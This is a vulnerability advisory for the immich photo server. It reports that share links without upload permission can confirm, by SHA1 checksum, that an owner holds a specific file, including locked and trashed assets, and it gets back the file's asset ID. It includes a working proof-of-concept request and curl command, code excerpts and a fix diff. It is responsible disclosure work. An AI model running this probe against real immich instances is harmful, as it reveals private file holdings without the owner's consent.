repo.description:
### Summary

Anyone with a share link URL can ask the server if the owner has a particular file. If the owner
has it, the server returns that file's asset ID. You need the file itself to ask, so this confirms a
guess rather than finding something new.

It works on assets the link does not cover. That includes assets in the Locked Folder and assets in
the trash. The owner sees nothing.

The link does not need upload permission. `allowUpload` is `false` by default when a link is created
(`server/src/schema/tables/shared-link.table.ts:38`), so this is the normal setup. A link password
does not stop it.

The request is an upload call with no file attached:

```
POST /api/assets?key=<link key>
x-immich-checksum: <sha1 of the file>
Content-Length: 0

200 {"status":"duplicate","id":"f0b032ae-6c9f-495b-ba98-33cba14419b5"}
```

The same link sending a real file gets `401`.

### Details

Four methods in `server/src/services/asset-media.service.ts` can be reached from `POST /api/assets`.
Three of them call `requireUploadAccess(auth)`:

```
 46:  async getUploadAssetIdByChecksum(...)    <- no check
 60:    requireUploadAccess(auth);             canUploadFile
 92:    requireUploadAccess(auth);             getUploadFilename
105:    auth = requireUploadAccess(auth);      getUploadFolder
```

Line 46 is the one without the check. Line 46 is also the one a share link reaches.

It gets there through the interceptor. `server/src/controllers/asset-media.controller.ts:51-53`
lists `AssetUploadInterceptor` before `FileUploadInterceptor`, so it runs first:

```ts
// server/src/middleware/asset-upload.interceptor.ts:18-25
const checksum = fromMaybeArray(req.headers[ImmichHeader.Checksum]);
const response = await this.service.getUploadAssetIdByChecksum(req.user, checksum);
if (response) {
  res.status(200);
  return of({ status: AssetMediaStatus.DUPLICATE, id: response.id });
}

return next.handle();
```

When the checksum matches, it answers and never calls `next.handle()`. So `FileUploadInterceptor`
and the controller handler never run. The upload checks are in those.

The query behind the lookup (`server/src/repositories/asset.repository.ts:683`) filters on `ownerId`
and `libraryId is null`. Every asset the owner uploaded is in range. External library assets are
not.

This is the check that would stop it:

```ts
// server/src/utils/access.ts:41-46
export const requireUploadAccess = (auth: AuthDto | null): AuthDto => {
  if (!auth || (auth.sharedLink && !auth.sharedLink.allowUpload)) {
    throw new UnauthorizedException();
  }
  return auth;
};
```

### Proof of concept

immich v3.3.1 in Docker. One owner with four assets: one in an album, one outside it, one in the
Locked Folder, one in the trash. The album is shared with `allowUpload: false` and
`allowDownload: false`. The link covers that album only.

The asset in the album is readable. The one outside it is not:

```
GET /api/assets/dfb3eb32-1b82-4837-951c-1db8b464150d?key=<key>   200
GET /api/assets/f0b032ae-6c9f-495b-ba98-33cba14419b5?key=<key>   400 {"message":"Not found or no asset.read access"}
```

The same link, asking by checksum:

```
POST /api/assets?key=<key>   x-immich-checksum: d5b6ee825e3d29140cad6cd9e181167e6090dc3e
  200 {"status":"duplicate","id":"f0b032ae-6c9f-495b-ba98-33cba14419b5"}    outside the album
POST /api/assets?key=<key>   x-immich-checksum: 30e0cedb8fc8fe6deb239cf06b5aed8e054acecb
  200 {"status":"duplicate","id":"a17be255-b684-45ee-aa39-4bd8822c04f6"}    Locked Folder
POST /api/assets?key=<key>   x-immich-checksum: 1820c639b7ca6711a2992dc922adbf383a346dd2
  200 {"status":"duplicate","id":"5ec503be-f1ac-4da7-baf3-4ab47b760323"}    trash
```

Two controls on the same link:

```
POST /api/assets?key=<key>   multipart/form-data with a real file   401 {"message":"Unauthorized"}
POST /api/assets             checksum header, no key                401 {"message":"Authentication required"}
```

A real upload is blocked, and the link key is what makes the checksum call work.

If the owner does not have the file, the answer is `400` with a validation error about the missing
body. A miss calls `next.handle()`, so the request falls through to the real upload path and fails
there.

A link password does not help. On a password-protected link,
`GET /api/shared-links/me?key=<key>` returns `401 {"message":"Password required"}`. The same key
with the checksum header still returns `200` and the ID.

One command, against the lab in the attached bundle:

```bash
curl -i -X POST 'http://127.0.0.1:8211/api/assets?key=<link key>' \
  -H 'x-immich-checksum: d5b6ee825e3d29140cad6cd9e181167e6090dc3e' -H 'Content-Length: 0'
```

The bundle has `docker-compose.yml`, `poc.sh`, `evidence.sh` and `EVIDENCE.txt` with full headers and
bodies for all eleven exchanges. `poc.sh` creates its own admin and assets, so it runs against an
empty container. It needs bash, curl and python3.

### Impact

The ID does not let the caller read the asset. `GET /assets/<id>?key=` is still `400`. What leaks is
that the owner has that exact file, and its ID. It covers assets the link was never meant to reach,
and assets the owner hid by locking or trashing them.

### Fix

Add the call the other three methods already make:

```diff
--- a/server/src/services/asset-media.service.ts
+++ b/server/src/services/asset-media.service.ts
@@
   async getUploadAssetIdByChecksum(auth: AuthDto, checksum?: string) {
     if (!checksum) {
       return;
     }
+    requireUploadAccess(auth);
```

It throws the same `401` the real upload path returns today. I would put it here rather than in the
interceptor. It keeps the check next to the lookup, and it matches the other three methods in the
file.

Confirmed on v3.3.1. The interceptor and the method are unchanged in v3.3.3.

### Disclosure

Please request a CVE when you publish this. I am happy to retest a patch.

All testing was against a container I ran locally.

Reported by Asif Masood (A51F221B), Application Security Engineer.
repo.summary: A share link with uploads disabled can test whether the owner has a given file
